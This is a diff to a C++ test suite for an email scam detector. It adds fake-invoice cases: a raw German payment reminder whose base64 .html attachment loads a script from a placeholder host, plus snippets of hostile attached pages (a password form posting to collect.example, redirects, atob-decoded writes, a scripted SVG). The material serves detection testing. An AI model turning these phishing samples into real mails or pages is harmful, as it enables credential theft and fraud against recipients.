@@ -6,6 +6,8 @@
 // target, an executable attachment — plus the equally important negative
 // cases, where an ordinary newsletter and an ordinary personal mail stay out
 // of the way.
+// Version: 0.9.0 - fake invoices: a payment reminder whose "invoice" is an .html page
+//                  loading a script, sent in a company's name from a foreign domain
 // Version: 0.8.0 - loan and credit offers (loan-offer-fraud): two real letters,
 //                  a proven bank, an ordinary mention of a loan
 // Version: 0.7.0 - romance scams (the letters of one reader's inbox), the
@@ -1359,6 +1361,8 @@ TEST(every_finding_belongs_to_a_switch) {
                               "reply-to-mismatch",
                               "reply-elsewhere", "attachment-disguised-executable",
                               "attachment-executable", "attachment-double-extension",
+                              "attachment-web-page", "attachment-active-page",
+                              "sender-company-mismatch",
                               "romance-scam", "government-impersonation", "crypto-content",
                               "crypto-wallet-secret", "crypto-payment-demand",
                               "crypto-investment-lure" }) {
@@ -1532,4 +1536,173 @@ TEST(raw_scans_read_the_process_wide_sender_lists) {
     REQUIRE(blocked.Has("blocked-sender"));
     REQUIRE(!trusted.Has("crypto-content"));            // the caution is a guessed kind
     REQUIRE(GetSenderLists() == SenderLists{});
+}
+
+// ---------------------------------------------------------------------------
+// Fake invoices: a web page attached, and a company's name from a foreign domain
+// ---------------------------------------------------------------------------
+// A payment reminder as it arrived (names and hosts replaced): a plumber's
+// name over a music site's address, the plumber's own address in the text,
+// and the "invoice" an .html file that loads a script from a hacked site.
+static const char* kHtmlInvoiceReminder =
+    "Return-Path: <no-reply@band-music.example>\r\n"
+    "Received: from band-music.example (unknown [200.60.92.165])\r\n"
+    "\tby mail.reader.example (Postfix) with ESMTP id 826D4C01113\r\n"
+    "Subject: Mahnung 2608144\r\n"
+    "From: Luka Deveric | Muster Rohrreinigung <no-reply@band-music.example>\r\n"
+    "To: Info <info@reader.example>\r\n"
+    "MIME-Version: 1.0\r\n"
+    "Content-Type: multipart/mixed; boundary=\"outer\"\r\n"
+    "\r\n"
+    "--outer\r\n"
+    "Content-Type: multipart/alternative; boundary=\"inner\"\r\n"
+    "\r\n"
+    "--inner\r\n"
+    "Content-Type: text/plain; charset=\"utf-8\"\r\n"
+    "\r\n"
+    "Sehr geehrter Herr Niedling, die angeh\xC3\xA4ngte Rechnung 2608144 ist zur Zahlung "
+    "f\xC3\xA4llig geworden. Bei Fragen: fibu@\r\n"
+    "--inner\r\n"
+    "Content-Type: text/html; charset=\"utf-8\"\r\n"
+    "\r\n"
+    "<html><body><p>Sehr geehrter Herr Niedling,</p>"
+    "<p>vielen Dank f\xC3\xBCr Ihren Auftrag. Wir erinnern Sie heute daran, dass die "
+    "angeh\xC3\xA4ngte Rechnung 2608144 zur Zahlung f\xC3\xA4llig geworden ist.</p>"
+    "<p>Wir bitten Sie, den offenen Betrag 1.202,50 \xE2\x82\xAC bis sp\xC3\xA4testens "
+    "30.06.2026 auf eines unserer Bankkonten zu \xC3\xBC" "berweisen.</p>"
+    "<p>Bei Fragen wenden Sie sich bitte an die Finanzbuchhaltung per Mail an "
+    "fibu@muster-rohrreinigung.example</p>"
+    "<p>Mit freundlichen Gr\xC3\xBC\xC3\x9F" "en</p><p>Muster Rohrreinigung GmbH</p>"
+    "</body></html>\r\n"
+    "--inner--\r\n"
+    "--outer\r\n"
+    "Content-Type: application/octet-stream; name=\"Rg-2608144_(563804).html\"\r\n"
+    "Content-Disposition: attachment; filename=\"Rg-2608144_(563804).html\"\r\n"
+    "Content-Transfer-Encoding: base64\r\n"
+    "\r\n"
+    "PGh0bWw+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0\r\n"
+    "ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPjwvaGVhZD48Ym9keT48ZGl2PlNlaHIgZ2VlaHJ0\r\n"
+    "ZSBEYW1lbiB1bmQgSGVycmVuLDwvZGl2PjxkaXY+aW0gQW5oYW5nIGZpbmRlbiBTaWUgSWhy\r\n"
+    "ZSBSZWNobnVuZyBSRS0yNjAwODU4LjwvZGl2PjxzY3JpcHQgc3JjPSJodHRwczovL3d3dy5o\r\n"
+    "YWNrZWQtc2l0ZS5leGFtcGxlLz91PWtrNG5hNGR0Y25zcnA3c2N1eXhnb2h5Ij48L3Njcmlw\r\n"
+    "dD48ZGl2PklociBUZWFtPC9kaXY+PC9ib2R5PjwvaHRtbD4=\r\n"
+    "--outer--\r\n";
+
+TEST(the_html_invoice_reminder_is_a_scam) {
+    const ThreatReport r = ScanRawMessage(kHtmlInvoiceReminder);
+    REQUIRE(r.Has("attachment-web-page"));
+    REQUIRE(r.Has("attachment-active-page"));
+    REQUIRE(r.Has("sender-company-mismatch"));
+    REQUIRE(r.level == ThreatLevel::Scam);
+    const std::string why = r.Summary();
+    REQUIRE(why.find("Rg-2608144_(563804).html") != std::string::npos);
+    REQUIRE(why.find("www.hacked-site.example") != std::string::npos);
+    REQUIRE(why.find("muster-rohrreinigung.example") != std::string::npos);
+    REQUIRE(why.find("band-music.example") != std::string::npos);
+}
+
+TEST(each_fake_invoice_sign_alone) {
+    // The page's name and the reminder alone: a Scam without reading the page.
+    ScanInput named = Letter("no-reply@band-music.example", "Mahnung 2608144",
+        "Die angeh\xC3\xA4ngte Rechnung ist zur Zahlung f\xC3\xA4llig.",
+        { "Rg-2608144_(563804).html" });
+    ThreatReport r = ScanMessage(named);
+    REQUIRE(r.Has("attachment-web-page"));
+    REQUIRE(r.level == ThreatLevel::Suspicious);
+    named.fromName = "Luka Deveric | Muster Rohrreinigung";
+    named.body += " Fragen an fibu@muster-rohrreinigung.example";
+    r = ScanMessage(named);
+    REQUIRE(r.Has("sender-company-mismatch"));
+    REQUIRE(r.level == ThreatLevel::Scam);
+
+    // An invoice number as the page's name is an invoice too.
+    REQUIRE_EQ(ScanMessage(Letter("a@b.example", "Hello", "See attached.",
+                                  { "Inv_44712.htm" })).score, 40);
+    // Any other page attached is a second look, not a verdict.
+    ScanInput report = Letter("colleague@firm.example", "Test run", "Results attached.",
+                              { "results.html" });
+    report.attachedPages.push_back({ "results.html",
+        "<html><body><h1>Results</h1><table><tr><td>42</td></tr></table>"
+        "<script>var rows = 1;</script></body></html>" });
+    r = ScanMessage(report);
+    REQUIRE(r.Has("attachment-web-page"));
+    REQUIRE(!r.Has("attachment-active-page"));
+    REQUIRE(r.level == ThreatLevel::Suspicious);
+    REQUIRE(!ScanMessage(Letter("a@b.example", "Hi", "Photos.", { "a.jpg", "notes.pdf" }))
+                 .Has("attachment-web-page"));
+}
+
+TEST(what_an_attached_page_does_is_read) {
+    auto active = [](const std::string& name, const std::string& page) {
+        ScanInput in = Letter("a@b.example", "Hello", "Attached.", { name });
+        in.attachedPages.push_back({ name, page });
+        return ScanMessage(in);
+    };
+    const ThreatReport form = active("doc.html",
+        "<form action=\"https://collect.example/p.php\"><input name=pw type=password></form>");
+    REQUIRE(form.Has("attachment-active-page"));
+    REQUIRE(form.level == ThreatLevel::Scam);
+    REQUIRE(form.Summary().find("collect.example") != std::string::npos);
+    REQUIRE(active("doc.html", "<meta http-equiv=\"Refresh\" content=\"0; url=https://go.example/x\">")
+                .Summary().find("go.example") != std::string::npos);
+    REQUIRE(active("doc.html", "<script>window.location.href='https://x.example'</script>")
+                .Has("attachment-active-page"));
+    REQUIRE(active("doc.html", "<script>document.write(atob('PGgxPg=='))</script>")
+                .Has("attachment-active-page"));
+    REQUIRE(active("doc.html", "<body onload=\"location.replace('https://x.example')\">")
+                .Has("attachment-active-page"));
+    REQUIRE(active("doc.html", "<iframe src=\"https://x.example/login\"></iframe>")
+                .Has("attachment-active-page"));
+    // An SVG picture with a script in it: the page rule, not the web-page one.
+    const ThreatReport svg = active("logo.svg",
+        "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>location='https://x.example'</script></svg>");
+    REQUIRE(svg.Has("attachment-active-page"));
+    REQUIRE(!svg.Has("attachment-web-page"));
+    // A plain page and a plain picture do nothing.
+    REQUIRE(!active("doc.html", "<p>Hello <a href=\"https://firm.example\">us</a></p>")
+                 .Has("attachment-active-page"));
+    REQUIRE(!active("logo.svg", "<svg xmlns=\"http://www.w3.org/2000/svg\"><circle r=\"4\"/></svg>")
+                 .Has("attachment-active-page"));
+    REQUIRE(FindingKeptForTrustedSender("attachment-active-page"));
+}
+
+TEST(a_companys_name_from_its_own_or_a_free_domain_is_not_a_mismatch) {
+    auto mismatch = [](const std::string& name, const std::string& from, const std::string& body,
+                       const std::string& auth = "") {
+        ScanInput in = Letter(from, "Angebot", body);
+        in.fromName = name;
+        in.authResults = auth;
+        return ScanMessage(in);
+    };
+    const std::string body = "Fragen an info@muster-rohrreinigung.example oder "
+                             "https://www.muster-rohrreinigung.example/kontakt";
+    REQUIRE(mismatch("Muster Rohrreinigung", "x@band-music.example", body)
+                .Has("sender-company-mismatch"));
+    // "MusterRohrreinigung" run together, and one long word of it.
+    REQUIRE(mismatch("Muster Rohrreinigung", "x@band-music.example",
+                     "Mail an info@musterrohrreinigung.example").Has("sender-company-mismatch"));
+    REQUIRE(mismatch("Rohrreinigung Nord", "x@band-music.example",
+                     "Mail an info@rohrreinigung.example").Has("sender-company-mismatch"));
+    // Its own domain, a domain carrying its name, a free mailbox, "via".
+    REQUIRE(!mismatch("Muster Rohrreinigung", "x@muster-rohrreinigung.example", body)
+                 .Has("sender-company-mismatch"));
+    REQUIRE(!mismatch("Muster Rohrreinigung", "x@mail.muster-rohrreinigung.example", body)
+                 .Has("sender-company-mismatch"));
+    REQUIRE(!mismatch("Muster Rohrreinigung", "x@muster-rohrreinigung-mail.example", body)
+                 .Has("sender-company-mismatch"));
+    REQUIRE(!mismatch("Muster Rohrreinigung", "muster.rohr@gmail.com", body)
+                 .Has("sender-company-mismatch"));
+    REQUIRE(!mismatch("Muster Rohrreinigung via Billing", "x@billing-service.example", body)
+                 .Has("sender-company-mismatch"));
+    // A word of the name alone that is short, or a domain not the name.
+    REQUIRE(!mismatch("Anna Muster", "anna@firm.example", "See https://www.example.org and "
+                      "https://shop-muster.example").Has("sender-company-mismatch"));
+    REQUIRE(!mismatch("Max Bug", "max@firm.example", "Mail bug@bug.example")
+                 .Has("sender-company-mismatch"));
+    // A proven sender domain (an invoicing service) gets a hint, not a verdict.
+    const ThreatReport proven = mismatch("Muster Rohrreinigung", "x@band-music.example", body,
+        "mx.reader.example; dkim=pass header.d=band-music.example; dmarc=pass "
+        "header.from=band-music.example");
+    REQUIRE(proven.Has("sender-company-mismatch"));
+    REQUIRE(proven.level == ThreatLevel::Clean);
 }
